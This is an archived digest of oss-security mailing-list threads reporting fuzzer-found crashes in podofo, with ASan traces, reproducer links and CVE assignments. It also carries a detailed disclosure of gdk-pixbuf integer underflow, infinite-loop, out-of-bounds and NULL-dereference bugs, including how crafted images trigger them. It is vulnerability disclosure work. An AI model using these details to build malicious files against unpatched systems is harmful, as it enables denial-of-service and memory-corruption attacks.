  0x00008028cb10: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x00008028cb20: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x00008028cb30: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x00008028cb40: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x00008028cb50: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==15599==ABORTING

Affected version:
0.9.4

Fixed version:
N/A

Commit fix:
N/A

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Reproducer:
https://github.com/asarubbo/poc/blob/master/00171-podofo-globaloverflow-PoDoFo-PdfParser-ReadXRefSubsection

Timeline:
2017-02-13: bug discovered
2017-03-02: bug reported to upstream
2017-03-02: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2017/03/02/podofo-global-buffer-overflow-in-podofopdfparserreadxrefsubsection-pdfparser-cpp

--
Agostino Sarubbo
Gentoo Linux Developer



```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489401102.9439_24.Morbo,U=41369:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `1507101.nareQZ76ga@blackgate`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
On Thursday 02 March 2017 16:35:17 Agostino Sarubbo 
wrote:
> Permalink:
> https://blogs.gentoo.org/ago/2017/03/02/podofo-global-buffer-overflow-in-pod
> ofopdfparserreadxrefsubsection-pdfparser-cpp

This is CVE-2017-6844

-- 
Agostino Sarubbo
Gentoo Linux Developer


```

</details>

---

</details>
<details>
<summary><strong>[oss-security] podofo: heap-based buffer overflow in PoDoFo::PdfVariant::DelayedLoad (PdfVariant.h)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488549987.3737_22.Morbo,U=38517:2, -->

##### "Agostino Sarubbo" <ago@gentoo.org>, `707094.299697445-sendEmail@localhost`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Description:
podofo is a C++ library to work with the PDF file format.

A fuzz on it discovered an heap overflow. The upstream project denies me to open a new ticket. So, I just will forward this on the -users mailing list.

The complete ASan output:

# podofocolor dummy $FILE foo
==5749==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x62500000a0f8 at pc 0x000000529e84 bp 0x7ffee90e1ad0 sp 0x7ffee90e1ac8
READ of size 1 at 0x62500000a0f8 thread T0
    #0 0x529e83 in PoDoFo::PdfVariant::DelayedLoad() const /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/podofo/base/../../src/base/PdfVariant.h:545:10
    #1 0x529e83 in PoDoFo::PdfVariant::GetReal() const /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/podofo/base/../../src/base/PdfVariant.h:675
    #2 0x52887e in ColorChanger::GetColorFromStack(int, std::vector<PoDoFo::PdfVariant, std::allocator >&) /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/colorchanger.cpp:423:33
    #3 0x525d4b in ColorChanger::ProcessColor(ColorChanger::EKeywordType, int, std::vector<PoDoFo::PdfVariant, std::allocator >&, GraphicsStack&) /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/colorchanger.cpp:449:28
    #4 0x521b3c in ColorChanger::ReplaceColorsInPage(PoDoFo::PdfCanvas*) /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/colorchanger.cpp:214:31
    #5 0x51ed8e in ColorChanger::start() /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/colorchanger.cpp:120:15
    #6 0x51c06d in main /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/podofocolor.cpp:116:12
    #7 0x7f6c2623561f in __libc_start_main /var/tmp/portage/sys-libs/glibc-2.22-r4/work/glibc-2.22/csu/libc-start.c:289
    #8 0x428718 in _start (/usr/bin/podofocolor+0x428718)

0x62500000a0f8 is located 8 bytes to the left of 8192-byte region [0x62500000a100,0x62500000c100)
allocated by thread T0 here:
    #0 0x518700 in operator new(unsigned long) /tmp/portage/sys-devel/llvm-3.9.0-r1/work/llvm-3.9.0.src/projects/compiler-rt/lib/asan/asan_new_delete.cc:78
    #1 0x52aa18 in __gnu_cxx::new_allocator::allocate(unsigned long, void const*) /usr/lib/gcc/x86_64-pc-linux-gnu/4.9.3/include/g++-v4/ext/new_allocator.h:104:27
    #2 0x52aa18 in __gnu_cxx::__alloc_traits<std::allocator >::allocate(std::allocator&, unsigned long) /usr/lib/gcc/x86_64-pc-linux-gnu/4.9.3/include/g++-v4/ext/alloc_traits.h:182
    #3 0x52aa18 in std::_Vector_base<PoDoFo::PdfVariant, std::allocator >::_M_allocate(unsigned long) /usr/lib/gcc/x86_64-pc-linux-gnu/4.9.3/include/g++-v4/bits/stl_vector.h:170
    #4 0x52aa18 in std::vector<PoDoFo::PdfVariant, std::allocator >::_M_insert_aux(__gnu_cxx::__normal_iterator<PoDoFo::PdfVariant*, std::vector<PoDoFo::PdfVariant, std::allocator > >, PoDoFo::PdfVariant const&) /usr/lib/gcc/x86_64-pc-linux-gnu/4.9.3/include/g++-v4/bits/vector.tcc:353
    #5 0x521bdd in std::vector<PoDoFo::PdfVariant, std::allocator >::push_back(PoDoFo::PdfVariant const&) /usr/lib/gcc/x86_64-pc-linux-gnu/4.9.3/include/g++-v4/bits/stl_vector.h:925:4
    #6 0x521bdd in ColorChanger::ReplaceColorsInPage(PoDoFo::PdfCanvas*) /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/colorchanger.cpp:170
    #7 0x51ed8e in ColorChanger::start() /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/colorchanger.cpp:120:15
    #8 0x51c06d in main /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/podofocolor.cpp:116:12
    #9 0x7f6c2623561f in __libc_start_main /var/tmp/portage/sys-libs/glibc-2.22-r4/work/glibc-2.22/csu/libc-start.c:289

SUMMARY: AddressSanitizer: heap-buffer-overflow /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/podofo/base/../../src/base/PdfVariant.h:545:10 in PoDoFo::PdfVariant::DelayedLoad() const
Shadow bytes around the buggy address:
  0x0c4a7fff93c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c4a7fff93d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c4a7fff93e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c4a7fff93f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c4a7fff9400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x0c4a7fff9410: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa[fa]
  0x0c4a7fff9420: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c4a7fff9430: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c4a7fff9440: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c4a7fff9450: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c4a7fff9460: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==5749==ABORTING

Affected version:
0.9.4

Fixed version:
N/A

Commit fix:
N/A

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Reproducer:
https://github.com/asarubbo/poc/blob/master/00170-podofo-heapoverflow-PoDoFo-PdfTokenizer-GetNextToken

Timeline:
2017-02-13: bug discovered
2017-03-02: bug reported to upstream
2017-03-02: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2017/03/02/podofo-heap-based-buffer-overflow-in-podofopdfvariantdelayedload-pdfvariant-h

--
Agostino Sarubbo
Gentoo Linux Developer



```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489401102.9439_22.Morbo,U=41368:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `64760680.BLaASAfYRE@blackgate`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
On Thursday 02 March 2017 16:34:57 Agostino Sarubbo 
wrote:
> Permalink:
> https://blogs.gentoo.org/ago/2017/03/02/podofo-heap-based-buffer-overflow-in
> -podofopdfvariantdelayedload-pdfvariant-h

This is CVE-2017-6843

-- 
Agostino Sarubbo
Gentoo Linux Developer


```

</details>

---

</details>
<details>
<summary><strong>[oss-security] podofo: NULL pointer dereference in ColorChanger::GetColorFromStack (colorchanger.cpp)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488549987.3737_20.Morbo,U=38516:2, -->

##### "Agostino Sarubbo" <ago@gentoo.org>, `201613.082873763-sendEmail@localhost`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Description:
podofo is a C++ library to work with the PDF file format.

A fuzz on it discovered a null pointer access. The upstream project denies me to open a new ticket. So, I just will forward this on the -users mailing list.

The complete ASan output:

# podofocolor dummy $FILE foo
==18954==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x00000052302d bp 0x7fc24b8e2000 sp 0x7ffcaaf21810 T0)
==18954==The signal is caused by a READ memory access.
==18954==Hint: address points to the zero page.
    #0 0x52302c in getVtablePrefix /tmp/portage/sys-devel/llvm-3.9.1-r1/work/llvm-3.9.1.src/projects/compiler-rt/lib/ubsan/ubsan_type_hash_itanium.cc:198
    #1 0x52302c in __ubsan::checkDynamicType(void*, void*, unsigned long) /tmp/portage/sys-devel/llvm-3.9.1-r1/work/llvm-3.9.1.src/projects/compiler-rt/lib/ubsan/ubsan_type_hash_itanium.cc:221
    #2 0x521082 in HandleDynamicTypeCacheMiss /tmp/portage/sys-devel/llvm-3.9.1-r1/work/llvm-3.9.1.src/projects/compiler-rt/lib/ubsan/ubsan_handlers_cxx.cc:37
    #3 0x521922 in __ubsan_handle_dynamic_type_cache_miss /tmp/portage/sys-devel/llvm-3.9.1-r1/work/llvm-3.9.1.src/projects/compiler-rt/lib/ubsan/ubsan_handlers_cxx.cc:87
    #4 0x538eb2 in ColorChanger::GetColorFromStack(int, std::vector<PoDoFo::PdfVariant, std::allocator >&) /tmp/portage/app-text/podofo-0.9.5/work/podofo-0.9.5/tools/podofocolor/colorchanger.cpp:430:33
    #5 0x530d50 in ColorChanger::ProcessColor(ColorChanger::EKeywordType, int, std::vector<PoDoFo::PdfVariant, std::allocator >&, GraphicsStack&) 
/tmp/portage/app-text/podofo-0.9.5/work/podofo-0.9.5/tools/podofocolor/colorchanger.cpp:449:28
    #6 0x52c2a9 in ColorChanger::ReplaceColorsInPage(PoDoFo::PdfCanvas*) /tmp/portage/app-text/podofo-0.9.5/work/podofo-0.9.5/tools/podofocolor/colorchanger.cpp:214:31
    #7 0x526921 in ColorChanger::start() /tmp/portage/app-text/podofo-0.9.5/work/podofo-0.9.5/tools/podofocolor/colorchanger.cpp:120:15
    #8 0x523b8d in main /tmp/portage/app-text/podofo-0.9.5/work/podofo-0.9.5/tools/podofocolor/podofocolor.cpp:116:12
    #9 0x7fc2490df78f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289
    #10 0x4300e8 in _start (/usr/bin/podofocolor+0x4300e8)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /tmp/portage/sys-devel/llvm-3.9.1-r1/work/llvm-3.9.1.src/projects/compiler-rt/lib/ubsan/ubsan_type_hash_itanium.cc:198 in getVtablePrefix
==18954==ABORTING

Affected version:
0.9.5

Fixed version:
N/A

Commit fix:
N/A

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Reproducer:
https://github.com/asarubbo/poc/blob/master/00217-podofo-nullptr-colorchanger-cpp

Timeline:
2017-03-01: bug discovered
2017-03-02: bug reported upstream
2017-03-02: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2017/03/02/podofo-null-pointer-dereference-in-colorchangergetcolorfromstack-colorchanger-cpp

--
Agostino Sarubbo
Gentoo Linux Developer



```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489401102.9439_21.Morbo,U=41367:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `1536479.pTyB5C28Yh@blackgate`

```
On Thursday 02 March 2017 16:34:17 Agostino Sarubbo wrote:
> Permalink:
> https://blogs.gentoo.org/ago/2017/03/02/podofo-null-pointer-dereference-in-c
> olorchangergetcolorfromstack-colorchanger-cpp

This is CVE-2017-6842

-- 
Agostino Sarubbo
Gentoo Linux Developer

```

</details>
<details>
<summary><strong>[oss-security] podofo: NULL pointer dereference in GraphicsStack::TGraphicsStackElement::~TGraphicsStackElement (graphicsstack.h)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488549987.3737_19.Morbo,U=38515:2, -->

##### "Agostino Sarubbo" <ago@gentoo.org>, `313929.373256059-sendEmail@localhost`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Description:
podofo is a C++ library to work with the PDF file format.

A fuzz on it discovered a null pointer dereference. The upstream project denies me to open a new ticket. So, I just will forward this on the -users mailing list.

The complete ASan output:

# podofocolor dummy $FILE foo
==7677==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x00000054b701 bp 0x7ffe64ec7cb0 sp 0x7ffe64ec7c80 T0)
==7677==The signal is caused by a READ memory access.
==7677==Hint: address points to the zero page.
    #0 0x54b700 in GraphicsStack::TGraphicsStackElement::~TGraphicsStackElement() /tmp/portage/app-text/podofo-0.9.5/work/podofo-0.9.5/tools/podofocolor/graphicsstack.h:29:11
    #1 0x55b772 in std::deque<GraphicsStack::TGraphicsStackElement, std::allocator >::pop_back() /usr/lib/gcc/x86_64-pc-linux-gnu/4.9.4/include/g++-v4/bits/stl_deque.h:1459:4
    #2 0x52c84d in ColorChanger::ReplaceColorsInPage(PoDoFo::PdfCanvas*) /tmp/portage/app-text/podofo-0.9.5/work/podofo-0.9.5/tools/podofocolor/colorchanger.cpp:190:35
    #3 0x526921 in ColorChanger::start() /tmp/portage/app-text/podofo-0.9.5/work/podofo-0.9.5/tools/podofocolor/colorchanger.cpp:120:15
    #4 0x523b8d in main /tmp/portage/app-text/podofo-0.9.5/work/podofo-0.9.5/tools/podofocolor/podofocolor.cpp:116:12
    #5 0x7fc9a444f78f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289
    #6 0x4300e8 in _start (/usr/bin/podofocolor+0x4300e8)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /tmp/portage/app-text/podofo-0.9.5/work/podofo-0.9.5/tools/podofocolor/graphicsstack.h:29:11 in GraphicsStack::TGraphicsStackElement::~TGraphicsStackElement()
==7677==ABORTING

Affected version:
0.9.5

Fixed version:
N/A

Commit fix:
N/A

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Reproducer:
https://github.com/asarubbo/poc/blob/master/00216-podofo-nullptr-graphicsstack-h

Timeline:
2017-03-01: bug discovered
2017-03-02: bug reported to upstream
2017-03-02: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2017/03/02/podofo-null-pointer-dereference-in-graphicsstacktgraphicsstackelementtgraphicsstackelement-graphicsstack-h

--
Agostino Sarubbo
Gentoo Linux Developer



```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489401102.9439_20.Morbo,U=41366:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `5267070.4mDNyxnpBX@blackgate`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
On Thursday 02 March 2017 16:33:47 Agostino Sarubbo 
wrote:
> Permalink:
> https://blogs.gentoo.org/ago/2017/03/02/podofo-null-pointer-dereference-in-g
> 
raphicsstacktgraphicsstackelementtgraphicsstackelement-
graphicsstack-h

This is CVE-2017-6841

-- 
Agostino Sarubbo
Gentoo Linux Developer


```

</details>

---

</details>
<details>
<summary><strong>[oss-security] podofo: invalid memory read in ColorChanger::GetColorFromStack (colorchanger.cpp)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488549986.3737_18.Morbo,U=38514:2,S -->

##### "Agostino Sarubbo" <ago@gentoo.org>, `921525.047483982-sendEmail@localhost`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Description:
podofo is a C++ library to work with the PDF file format.

A fuzz on it discovered an invalid memory read. The upstream project denies me to open a new ticket. So, I just will forward this on the -users mailing list.

The complete ASan output:

# podofocolor dummy $FILE foo
==9073==ERROR: AddressSanitizer: SEGV on unknown address 0xffffffffffffffe0 (pc 0x000000537d67 bp 0x7ffc54cb3c50 sp 0x7ffc54cb3ba0 T0)
==9073==The signal is caused by a READ memory access.
    #0 0x537d66 in ColorChanger::GetColorFromStack(int, std::vector<PoDoFo::PdfVariant, std::allocator >&) /tmp/portage/app-text/podofo-0.9.5/work/podofo-0.9.5/tools/podofocolor/colorchanger.cpp:416:32
    #1 0x530d50 in ColorChanger::ProcessColor(ColorChanger::EKeywordType, int, std::vector<PoDoFo::PdfVariant, std::allocator >&, GraphicsStack&) 
/tmp/portage/app-text/podofo-0.9.5/work/podofo-0.9.5/tools/podofocolor/colorchanger.cpp:449:28
    #2 0x52c2a9 in ColorChanger::ReplaceColorsInPage(PoDoFo::PdfCanvas*) /tmp/portage/app-text/podofo-0.9.5/work/podofo-0.9.5/tools/podofocolor/colorchanger.cpp:214:31
    #3 0x526921 in ColorChanger::start() /tmp/portage/app-text/podofo-0.9.5/work/podofo-0.9.5/tools/podofocolor/colorchanger.cpp:120:15
    #4 0x523b8d in main /tmp/portage/app-text/podofo-0.9.5/work/podofo-0.9.5/tools/podofocolor/podofocolor.cpp:116:12
    #5 0x7f36fe7fe78f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289
    #6 0x4300e8 in _start (/usr/bin/podofocolor+0x4300e8)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /tmp/portage/app-text/podofo-0.9.5/work/podofo-0.9.5/tools/podofocolor/colorchanger.cpp:416:32 in ColorChanger::GetColorFromStack(int, std::vector<PoDoFo::PdfVariant, std::allocator >&)
==9073==ABORTING

Affected version:
0.9.5

Fixed version:
N/A

Commit fix:
N/A

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Reproducer:
https://github.com/asarubbo/poc/blob/master/00215-podofo-invalidread-colorchanger-cpp

Timeline:
2017-03-01: bug discovered
2017-03-02: bug reported upstream
2017-03-02: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2017/03/02/podofo-invalid-memory-read-in-colorchangergetcolorfromstack-colorchanger-cpp

--
Agostino Sarubbo
Gentoo Linux Developer



```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489401102.9439_19.Morbo,U=41365:2,S -->

##### Agostino Sarubbo <ago@gentoo.org>, `5122386.RPgm0aLzSn@blackgate`

```
On Thursday 02 March 2017 16:33:13 Agostino Sarubbo wrote:
> Permalink:
> https://blogs.gentoo.org/ago/2017/03/02/podofo-invalid-memory-read-in-colorc
> hangergetcolorfromstack-colorchanger-cpp

This is CVE-2017-6840

-- 
Agostino Sarubbo
Gentoo Linux Developer

```

</details>
<details>
<summary><strong>[oss-security] another bunch of crashes in podofo</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488549988.3737_30.Morbo,U=38524:2, -->

##### "Agostino Sarubbo" <ago@gentoo.org>, `775652.980522381-sendEmail@localhost`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Hello,

I discovered other crashes in podofo, I forwarded them to upstream via the -users mailing list.
To avoid duplicates (i.e. bugs with different stacktrace but with the same root cause), I will probably stop the fuzz on it until I see an upstream reaction.

--
Agostino Sarubbo
Gentoo Linux Developer



```

</details>

---

</details>

## gdk-pixbuf
<details>
<summary><strong>[oss-security] CVE Request - Multiple vulnerabilities in gdk-pixbuf</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487716700.10279_17.NdNdNx,U=7585:2,ST -->

##### Ariel Zelivanski <ariel.zelivans@gmail.com>, `CAE-_4r3PgqHs2kVHLTzynYhcffE_AWu1Y8QFM5LXeA8kvMnbrw@mail.gmail.com`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Hello,

I just reported several vulnerabilities in gdk-pixbuf. I am adding the
relevant details but you can also refer to the bug reports in the links. If
suitable please assign CVEs.

1. An dangerous integer underflow in io-icns.c [1]
--------------------------------------------------
io-icns.c is the source code for the loader of Macintosh icons.

An integer underflow I found allows an attacker to lead to different calls
to gdk_pixbuf_loader_write with a huge (2^32-1) count (size of buffer) that
can be bigger than the actual size of given buffer. It is possible to give
the loader any data we want so we can call any desired loader that it's
data is recognized. This may lead to various behaviors - multiple
out-of-buffer reads, infinite loops, or allocation attempt with the size.
Possibly other behaviors I did not test for (I didn't really check all
available loaders).

1.1 The bug
-----------
In the load_resources function (io-icns.c:63), inside the size switch (line
101), all the cases set plen or mlen to: blocklen - sizeof
(IcnsBlockHeader);
See lines 109, 117, 127, 134, 139, 146, 151, 158 and 163.
blocklen is set in line 95:

blocklen = GUINT32_FROM_BE (header->size);

There are no checks on the size of blocklen and if it is set to less than
sizeof (IcnsBlockHeader) (should be 8) there is an integer underflow.

This is dangerous because it's value is later passed to
gdk_pixbuf_loader_write (line 262) when size is 256. This allows an
attacker to craft a file that will end up calling to a desired loader with
a bogus size that is much larger than the actual buffer size.

Possible exploits of the bug:
1. Adding a bmp, or a an ico image data after the header will cause an
out-of-buffer read.
2. With a tiff image it would lead to an infinite loop (see bug 2).
3. With a gif, a tga or another icns after the header the code will try to
allocate as much as count bytes (and most likely fail on a size of 2^32-1).
Otherwise if the actual data size is less than 4096 there is an
out-of-bounds read.
4. With another icns it is possible to reach another out-of-bounds
4.1 If this out-of-bounds read gets zeros we will have an infinite loop

2. Infinite loop in io-tiff.c [2]
---------------------------------
This loader for tiff images will try and allocate a buffer as big as size
given to it. It calls the make_available_at_least function to do that.
The problem is in the function itself (from line 499):

if (need_alloc > context->allocated) {
    guint new_size = 1;
    while (new_size < need_alloc)
        new_size *= 2;
...

new_size starts with 1 and multiplies until it is larger or equal to
need_alloc. If need_alloc is larger than 2^31, new_size will become 2^31
and multiply itself in 2, and become 0. This would lead to an infinite loop.

3. Out-of-bounds read on io-ico.c [3]
-------------------------------------
io-ico.c is the source code for the loader of Windows icons.

State->HeaderSize is calculated in line 334:
State->HeaderSize = entry->DIBoffset + INFOHEADER_SIZE
entry->DIBoffset is read directly from the data

An integer overflow seems possible. However in line 336 it is checked if
(State->HeaderSize < 0), to prevent such overflow.
This works when compiling without or with basic optimization (in gcc, -O0
or -O1), but from -O2 this check seems to be ignored. Specifically when
compiled with "O1 -fstrict-overflow -ftree-vrp".
I believe many distributions are building with these flags.

When this is overflown it is possible later to reach a segmentation fault
thanks to an out-of-bounds read of the BIH variable (line 359: BIH =
Data+entry->DIBoffset;).

I tested this both on Arch and on Ubuntu 16.04.1 but it certainly affects
other distributions as well.

4. NULL dereference on gdk-pixbuf-thumbnailer [4]
-------------------------------------------------
This is a bug in gnome-thumbnailer-skeleton.c and it affects only the
latest versions of gdk-pixbuf (since moving the code from gnome-desktop the
the external thumbnailer in gdk-pixbuf[5]).

gnome-thumbnailer-skeleton.c:272 calls file_to_pixbuf. file_to_pixbuf
(gdk-pixbuf-thumbnailer.c:209) calls _gdk_pixbuf_new_from_uri_at_scale,
which calls gdk_pixbuf_loader_get_pixbuf (see gdk-pixbuf-thumbnailer:195).
gdk_pixbuf_loader_get_pixbuf may returns NULL, and it doesn't get a pointer
to an error object to set an error.
So when it returns NULL, on file_to_pixbuf pixbuf will be NULL, and on line
312 printing error->message will result in a NULL deference (error->message
will be 0x0 + 0x8).

5. Impact
---------
These bugs can break many binaries that rely on gdk-pixbuf and I can think
of various ways these bugs can be used maliciously. Obvious applications
are to cause DoS by segmentation faults or possibly by CPU exhaustion (with
the infinite loops) when possible. Besides crashing the thumbnailer and
some other desktop applications that use gdk-pixbuf I also managed to crash
Chromium and Firefox on Ubuntu (on both via their file browser which use
gdk-pixbuf). To see the full list of packages that use gdk-pixbuf on apt
based distributions run `apt-cache rdepends libgdk-pixbuf2.0-0
libgdk-pixbuf2.0-dev`.

Thanks to afl for helping me find bugs 3 and 4.

Links

[1] https://bugzilla.gnome.org/show_bug.cgi?id=779016
[2] https://bugzilla.gnome.org/show_bug.cgi?id=779020
[3] https://bugzilla.gnome.org/show_bug.cgi?id=779012
[4] https://bugzilla.gnome.org/show_bug.cgi?id=778204
[5]
https://git.gnome.org/browse/gdk-pixbuf/commit/?id=06cf4c78067203b78acbfb29862350cdb8200b73
[6] A blog post I wrote about this -
http://mov.sx/2017/02/21/bug-hunting-gdk-pixbuf.html


```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487716701.10279_30.NdNdNx,U=7598:2,T -->

##### Leo Famulari <leo@famulari.name>, `20170221204235.GA26169@jasmine`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
On Tue, Feb 21, 2017 at 05:20:11PM +0200, Ariel Zelivanski wrote:
> Hello,
> 
> I just reported several vulnerabilities in gdk-pixbuf. I am adding the
> relevant details but you can also refer to the bug reports in the links. If
> suitable please assign CVEs.

As announced previously [0], MITRE is no longer assigning CVEs based on
messages to this list. Will you request the CVE IDs via the new web
form? [1]

[0]
http://seclists.org/oss-sec/2017/q1/351

[1]
https://cveform.mitre.org/

```

</details>
<details><summary>Additional Parts</summary>

```
-----BEGIN PGP SIGNATURE-----

iQIzBAABCAAdFiEEsFFZSPHn08G5gDigJkb6MLrKfwgFAlispjcACgkQJkb6MLrK
fwiEkA//RoghGrWq90CKZGMaH6MjVnSHjEWrQzTK0Fki9EgVT70NPkwyUrsJZHE/
MwJ4cNtsxgpeEpgQevp2BB0yLoQ9aRKLmuAbuxyCPzdhOtwiFK/tuxLmjNj/IxZ9
+z+/G9tBA4xpH35DVWM5ugYhGmK65YreVtWM1PJ82Jk0YuSt8uKjLEcNxwKsl4la
PJ4ddx7y6Ps7KtPzHQRI7o2PTWD30KbG/mU8APBrZZqj3oZ6Az/D4ds6r7nW3XbJ
dipxW80JuLw+6/YszZ8lqSIsQIAUWromJpYYoP5ztkBZ0N/oHguL1aGBAp2GXFrA
Nw+26lf4tA6REhucMjXZvneKSs/PciSEnRrX5E876JjwMuVvWYyiFoFU723+CtyI
OAR0LYySyoPgZq43Mb3RiXSHmuwSj91FgmRNDs2WBMVsr/EGqZHMjXaXomiQJDgp
bhj3pF0v4R6qenPm71UtiipxPkQtqRnvEKoX1RdcsFhMLF1ZhpxFvCUHOciisZfM
ltjKQXr91JFutK6e7UXkrKKBgvuhXwyM00XokGPisRd7/x4Ce7piGGDu0tTjOV2J
QKGnfleuztqYKa6npNXekUBmcNVskLKsF84mCHqueCi/pJ7/iV6kztwA+zrrVETi
JV2/IhFJ2ejG/kMFnPYfA9cQFTZHztiPUVFa1NWD5abjwbFfyhU=
=FTxv
-----END PGP SIGNATURE-----


```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487850524.12837_4.NdNdNx,U=7661:2,T -->

##### Ariel Zelivansky <ariel.zelivans@gmail.com>, `CAE-_4r1MsrEuyF9cYcJe4bg4PrpD-YYptCq2ycZKYF9fT__Jpg@mail.gmail.com`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Leo, thanks for the reference.

I have requested a CVE via the web form and haven't heard from MITRE so
far. Do they usually take time in responding?
Or am I supposed to contact some other CNA?

On Tue, Feb 21, 2017 at 10:42 PM, Leo Famulari <leo@famulari.name> wrote:

> On Tue, Feb 21, 2017 at 05:20:11PM +0200, Ariel Zelivanski wrote:
> > Hello,
> >
